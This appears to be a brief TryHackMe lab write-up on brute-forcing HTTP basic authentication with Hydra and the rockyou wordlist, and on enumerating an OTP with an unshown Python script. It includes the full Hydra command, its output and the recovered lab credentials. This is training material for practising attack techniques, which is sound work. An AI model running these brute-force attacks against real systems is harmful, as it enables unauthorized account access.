---
title: Enumeration & Brute Force
description: 'Brute forcing basic auth with Hydra and a OTP with a custom python script'
pubDate: 2024-08-03
category: 'tryhackme'
tags: ['One Time Pass']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/645b19f5d5848d004ab9c9e2-1719928599415'
---

## BASIC AUTH
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt enum.thm http-head /labs/basic_auth/
...[snip]...
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-head://enum.thm:80/labs/basic_auth/
[80][http-head] host: enum.thm   login: admin   password: yellow
1 of 1 target successfully completed, 1 valid password found
```

## OTP

Using a python script (`script.py`) we can enumerate the emails and get the OTP:

```
user: admin@admin.com
token: 150
password: m09CjZgF
```
